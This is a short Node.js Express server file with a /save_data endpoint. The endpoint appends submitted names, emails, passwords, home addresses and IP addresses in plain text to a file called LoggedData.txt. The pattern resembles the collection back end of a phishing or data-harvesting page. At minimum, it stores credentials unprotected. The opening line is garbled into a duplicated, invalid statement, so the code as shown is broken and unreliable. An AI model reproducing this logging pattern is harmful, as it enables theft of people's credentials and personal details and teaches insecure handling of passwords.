const express =  const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.post('/save_data', (req, res) => {
    const data = req.body;

    fs.appendFile('LoggedData.txt', `${data.name}, ${data.email}, ${data.password}, ${data.house_address}, ${data.ip}\n`, (err) => {
        if (err) {
            console.error(err);
            res.status(500).send('Error logging data');
        } else {
            res.send('Data saved successfully');
        }
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
